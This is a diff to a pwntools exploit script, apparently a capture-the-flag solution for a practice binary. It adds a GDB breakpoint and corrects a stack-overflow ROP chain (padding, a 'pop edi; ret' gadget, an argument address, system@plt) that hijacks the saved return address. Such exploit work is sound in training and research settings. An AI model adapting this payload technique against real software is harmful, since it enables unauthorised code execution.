@@ -26,6 +26,7 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = '''
 break *0x{exe.symbols.pwnme:x}
+break *0x0000000000400804
 continue
 '''.format(**locals())
 
@@ -61,11 +62,11 @@ print(msg)
 # address of a ROP chain, that will overwrithe the saved RIP.
 vector = "A" * 40
 # Address of a "ret" gadget
-vector += p64(0x4005b9)
-# A value to pop from the stack, and the address of a
-# "pop edi; ret" gadget
-vector += p64(0x00601060)
+#vector += p64(0x4005b9)
+# The address of a "pop edi; ret" gadget
 vector += p64(0x400883)
+# A value for to be popped from the stack by "pop edi".
+vector += p64(0x00601060)
 # Address of system@plt
 vector += p64(0x4005e0)
 io.sendline(vector)
